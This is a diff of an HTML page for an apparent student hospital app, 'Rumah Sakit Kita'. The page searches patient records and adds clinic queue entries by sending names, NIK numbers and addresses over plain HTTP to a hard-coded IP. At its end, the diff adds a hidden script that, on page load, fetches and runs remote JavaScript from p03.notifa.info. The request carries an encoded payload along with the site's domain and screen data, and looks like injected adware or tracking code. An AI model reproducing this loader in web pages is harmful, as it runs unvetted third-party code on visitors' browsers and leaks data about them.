@@ -1,4 +1,4 @@
-<html lang="en">
+<!--<html lang="en">
     <head>
         <title>Rumah Sakit Kita</title>
         <meta charset="utf-8">
@@ -99,55 +99,58 @@
                 <font color="blue"><h2>We Are One</h2></font><font color="white"><b></b></font></a>
         </div>
 
-        <div class="container">
-            <div class="row">
-                <div class="col-sm-4">
-                    <h1><font face="Times New Roman" color=white size="6">Pencarian Data Pasien</font></h1>
-                    <form action="" id="registerForm" onsubmit="return make_json(this);" method="POST">
-                        <div class="container">
-                            <br><div class ="form-group">
-                                <h2><font face="Times New Roman" color=white size="4">No Rekam Medis</font></h2>
-                                <input type="text" placeholder="Enter No Rekam Medis" id="noRM" required/>
-                            </div>
-                            
-                            <h1><font face="Times New Roman" color=white size="6">Hasil Pencarian Data Pasien</font></h1>
-                            <div class ="form-group">
-                                <h2><font face="Times New Roman" color=white size="4">Nama</font></h2>
-                                <input type="text" placeholder="Enter Nama" id="nama" required/>
-                            </div>
-                            <div class ="form-group">
-                                <h2><font face="Times New Roman" color=white size="4">NIK</font></h2>
-                                <input type="text" placeholder="Enter NIK" id="nik" required/>
-                            </div>
-                            <div class ="form-group">
-                                <h2><font face="Times New Roman" color=white size="4">Alamat</font></h2>
-                                <input type="text" placeholder="Enter Alamat" id="alamat" required/>
-                            </div>         
-                            <div class ="form-group">
-                                <h2><font face="Times New Roman" color=white size="4">Tanggal Berobat Rawat Jalan</font></h2>
-                                <input type="date" placeholder="Enter Tanggal Rawat" id="tanggalRawat" required/>
-                            </div>
-                            <div class ="form-group">
-                                <h2><font face="Times New Roman" color=white size="4">Nama Klinik</font></h2>
-                                <select name="namaKlinik">
-                                    <option value="mata">Mata</option>
-                                    <option value="gigi">Gigi</option>
-                                    <option value="gigi">Hati</option>
-                                </select>
-                            </div> 
-                            <div class="clearfix">
-                                <button id="save" type="submit" class="signup">Daftar</button>
-                            </div><br><br>
-                        </div>
-                        <p id="output"></p>
-                    </form>
+                <div class="container">
+                    <div class="row">
+                        <div class="col-sm-4">
+
+        <form action="" id="registerForm" onsubmit="return make_json(this);" method="POST">
+            <h1><font face="Times New Roman" color=white size="6">Pencarian Data Pasien</font></h1>
+            <div class="container">
+                <br><div class ="form-group">
+                    <h2><font face="Times New Roman" color=white size="4">No Rekam Medis</font></h2>
+                    <input type="text" placeholder="Enter No Rekam Medis" id="noRM" required/>
                 </div>
+                <button onclick="cariPasien" id="save" type="submit" class="btn btn-info btn-md">Cari</button>
+                <br><br>
+
+                <h1><font face="Times New Roman" color=white size="6">Hasil Pencarian Data Pasien</font></h1>
+                <div class ="form-group">
+                    <h2><font face="Times New Roman" color=white size="4">Nama</font></h2>
+                    <input type="text" id="nama" value=""/>
+                </div>
+                <div class ="form-group">
+                    <h2><font face="Times New Roman" color=white size="4">NIK</font></h2>
+                    <input type="text" id="nik" value=""/>
+                </div>
+                <div class ="form-group">
+                    <h2><font face="Times New Roman" color=white size="4">Alamat</font></h2>
+                    <input type="text" id="alamat" value=""/>
+                </div>         
+                <div class ="form-group">
+                    <h2><font face="Times New Roman" color=white size="4">Tanggal Berobat Rawat Jalan</font></h2>
+                    <input type="text" id="tanggalRawat" value=""/>
+                </div>
+                <div class ="form-group">
+                    <h2><font face="Times New Roman" color=white size="4">Nama Klinik</font></h2>
+                    <select name="namaKlinik" id="namaKlinik">
+                        <option value="mata">Mata</option>
+                        <option value="gigi">Gigi</option>
+                        <option value="gigi">Hati</option>
+                    </select>
+                </div> 
+                <div class="clearfix">
+                    <button id="save" type="submit" class="signup">Daftar</button>
+                </div><br><br>
             </div>
-        </div>
+            <p id="output"></p>
+        </form>
+                        </div>
+                    </div>
+                </div>
 
         <script>
-            function loadDoc() {
-                var url = "http://202.94.83.190:8080/165314026_RumahSalitKita/webresources/pasien/cariPaaien?noRm=" + nrm.value;
+            function cariPasien() {
+                var url = "http://202.94.83.190:8080/165314026_RumahSalitKita/webresources/pasien/cariPasien?noRm=" + nrm.value;
                 var xhttp = new XMLHttpRequest();
                 xhttp.open("GET", url, true);
                 xhttp.send();
@@ -160,7 +163,7 @@
                     }
                 };
             }
-        
+
             function make_json(form) {
                 var json = {
                     "tanggalRawat": form.tanggal.value,
@@ -184,4 +187,203 @@
             <p><font face="Century Gothic">This page is copyrighted © 2018 by yovandapriscill_a</font></p>
         </footer>
     </body>
+</html>-->
+
+<html>
+    <title>Rumah Sakit Kita</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <style>
+
+        /*untuk mengatur menu yang diatas*/ 
+        .navbar {
+            background-image: url(http://gifimage.net/wp-content/uploads/2017/09/animasi-bintang-bergerak-gif-11.gif);
+            margin-bottom: 0;
+            border-radius: 0;
+            text-align: right;
+        }
+
+        /*setting footer bagian bawah laman*/
+        footer {
+            position: fixed;
+            background-image: url(http://gifimage.net/wp-content/uploads/2017/09/animasi-bintang-bergerak-gif-11.gif);
+            background-color: black;
+            color: white;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+        }
+
+        /*setting tombol button*/
+        .button {
+            display: inline-block;
+            border-radius: 6px;
+            background-color: #1EE849;
+            border: none;
+            color: white;
+            text-align: center;
+            font-size: 28px;
+            padding: 8px;
+            width: 146px;
+            transition: all 0.5s;
+            cursor: pointer;
+        }
+
+        /*yang ditengah*/
+        .jumbotron {
+            background-image: url(https://1.bp.blogspot.com/-7VxyjAGIVAk/UMbg9yfQiSI/AAAAAAAAAZY/v0gzT71BVOQ/s1600/cardiology-rhythm-ppt-background.jpg);
+            background-color: whitesmoke;
+            margin-bottom: 0;
+            min-height: 50%;
+            padding : 20px;
+            background-repeat: no-repeat;
+            background-position: center;
+            -webkit-background-size: cover;
+            background-size: cover;
+        }
+
+        a {
+            font-family: 'Times New Roman', sans-serif;
+            font-size: 15px;
+        }
+
+        @media (max-width: 600px) {
+            nav, article {
+                width: 100%;
+                height: auto;
+            }
+        }
+    </style>   
+</head>
+
+<body style="background-image : url(http://gifimage.net/wp-content/uploads/2017/09/animasi-bintang-bergerak-gif-11.gif)">
+    <nav class="navbar navbar-inverse">
+        <div class="container-fluid">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span> 
+                    <span class="icon-bar"></span>               
+                </button>
+            </div>
+            <div class="collapse navbar-collapse" id="myNavbar">
+                <ul class="nav navbar-nav">
+                    <li><a href="indexUser.html">Home</a></li>
+                    <li><a href="tambahPasien.html">Pendaftaran Pasien</a></li>
+                    <li class="active"><a href="tambahAntrian.html">Antri Klinik</a></li>
+                    <li><a href="daftarPasien.html">Daftar Pasien RS.Kita</a></li>
+                    <li><a href="indexAll.html">Keluar</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="jumbotron text-center">
+        <a href="indexAll.html" style="text-decoration: aqua"><font color="black"><h1>Rumah Sakit Kita</h1></font>
+            <font color="blue"><h2>We Are One</h2></font><font color="white"><b></b></font></a>
+    </div>
+
+    <form onsubmit="return make_json(this);" style="border:1px solid #ccc" method="POST">
+        <div class="form-group">
+            <p>
+                <strong>Pencarian data pasien</strong>
+                <br>
+            </p>
+
+            <div class="contact-form">
+                <table>
+                    <tr><td>No Rekam Medis</td> <td>:</td> <td><input type="text" id="nrm"/> <button type="button" onclick="loadDoc()" id="btn">Cari</button></td></tr>
+
+                </table>
+                <br/><h2><strong>Hasil Pencarian</strong></h2>
+                <table width="400px">
+                    <tr><td>Nama</td> <td>:</td><td><input type="text" id="nama" value=""/></td>
+                    <tr><td>NIK</td> <td>:</td><td><input type="text" id="nik" value=""/></td></tr>
+                    <tr><td>Alamat</td> <td>:</td><td><input type="text" id="alamat" value=""/></td></tr>
+                    <tr><td>Tanggal Rawat Jalan</td> <td>:</td><td><input type="Date" id="tanggal" value=""/></td></tr>
+                    <tr><td>Nama Klinik</td> <td>:</td><td>
+                            <select name="klinik" id=namaKlinik>
+                                <option style="color: black" label="--pilih klinik--"></option>
+                                <option style="color: black" label="anak">anak</option>
+                                <option style="color: black" label="mata">mata</option>
+                                <option style="color: black" label="gigi">gigi</option>
+                            </select>
+                        </td></tr>
+                </table>
+
+                <input type="submit" value="Tambah"/>
+                <pre id="berhasil">
+                </pre>
+            </div>
+        </div>
+    </form>
+
+    <script>
+        function loadDoc() {
+
+            var url = "http://202.94.83.190:8080/165314026_RumahSakitService/webresources/pasien/cariPasien?noRm=" + nrm.value;
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("GET", url, true);
+            xhttp.send();
+            xhttp.onreadystatechange = function () {
+                if (this.readyState == 4 && this.status == 200) {
+                    var objj = JSON.parse(this.responseText);
+                    document.getElementById("nama").value = objj.nama;
+                    document.getElementById("nik").value = objj.nik;
+                    document.getElementById("alamat").value = objj.alamat;
+                }
+            };
+        }
+
+
+        function make_json(form) {
+            var json = {
+                "tanggal": form.tanggal.value,
+                "noRm": form.nik.value,
+                "nama": form.nama.value,
+                "alamat": form.alamat.value,
+                "namaKlinik": form.namaKlinik.value
+            };
+            var html = JSON.stringify(json, 0, 100);
+
+            var Url = "http://202.94.83.190:8080/165314026_RumahSakitService/webresources/antrian/addAntrian";
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', Url, false);
+            xhr.setRequestHeader("Content-type", "application/json");
+            xhr.send(html);
+
+            document.getElementById("berhasil").innerHTML = "Pendaftaran Berhasil";
+            return false;
+        }
+    </script>
+
+    <script type="text/javascript">if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function () {
+                    fn();
+                    callback();
+                }, 0);
+            }
+            function sync(fn) {
+                fn();
+            }
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bda0S111ejAprrrLntx6iUjY0Hw0yqFTSjpUdleL85NjaxamDVpPGUrGK4qsCgd62VLU7YgBBhi4ETRBFA9EhIP0jr3KmedBKNA6dLmm2LyagGiZDYF1qCNVF45jj3vh710NQgAdjRK3Y0%2f1UTxu0bStSRKuA0PjWejUjqj5ysr2ci1GTy8Rozy6gZkzLFOo%2fBuMcTvDiQ016gmHxb6Z%2bMVD7qo6zs6kHfnCQeHa%2bZUEDRck9n5rYzabc1Ywqst%2fSTPl%2b5BBfyLqP2%2fJRNs0v%2fHVR0oQPhgdYZJCNUwH%2fFyflHWc2jFTjqRIWctl1J64MxjjdxlVarsa%2fTMncWEFsTHAxlkleLImCMSZVFKUw6R6Rr5hVztx0ieZRxd8LuqCFHipQx288RWwP2%2f1q9AccelTvSEYoEqxSLEQjJqWd6COAq%2fmSamuSx4ZYzw1wiV0cDwosRLBSdRSTXtpDyY0zVtbGqOyKEd2pYCDyI9ag5TdPF42NFx6daWu0rgUkTWTNjPENJipJLup%2bq3LgjXcCxJeq%2flrPJ840XEwjkanZLi%2bc%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function () {});
+        }
+        ;</script></body>
 </html>
